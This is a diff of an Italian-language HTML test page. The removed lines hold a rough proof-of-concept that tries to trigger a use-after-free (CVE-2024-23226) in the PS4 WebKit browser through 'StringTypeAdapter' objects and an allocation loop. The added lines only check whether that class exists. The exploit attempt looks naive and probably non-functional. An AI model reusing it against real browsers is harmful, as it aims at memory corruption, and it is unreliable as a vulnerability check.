@@ -1,30 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC CVE-2024-23226 - PS4 WebKit Test</title>
+    <title>Test StringTypeAdapter</title>
     <script>
-        function gc() {
-            for (let i = 0; i < 50; i++) {
-                let a = new Uint8Array(1024 * 10); // 10 KB per iterazione
-            }
-        }
-
-        function triggerUAF() {
+        function checkSupport() {
             try {
-                class FakeAdapter {
-                    constructor(str) {
-                        this.adapter = new StringTypeAdapter(str);
-                    }
+                if (typeof StringTypeAdapter !== "undefined") {
+                    alert("StringTypeAdapter ESISTE nel browser!");
+                } else {
+                    alert("StringTypeAdapter NON è supportata.");
                 }
-
-                let testStr = "AAAAAAAAAAAAAAAAAAAA";
-                let adapter1 = new FakeAdapter(testStr);
-                let adapter2 = new FakeAdapter(testStr);
-
-                // Forza un leggero disturbo nella memoria per aiutare il trigger del UAF
-                gc();
-
-                alert("Se il browser crasha o si blocca, potrebbe essere vulnerabile!");
             } catch (e) {
                 alert("Errore: " + e.message);
             }
@@ -32,7 +17,7 @@
     </script>
 </head>
 <body>
-    <h1>PoC CVE-2024-23226 - Test su PS4</h1>
-    <button onclick="triggerUAF()">Testa la vulnerabilità</button>
+    <h1>Test StringTypeAdapter</h1>
+    <button onclick="checkSupport()">Verifica</button>
 </body>
 </html>
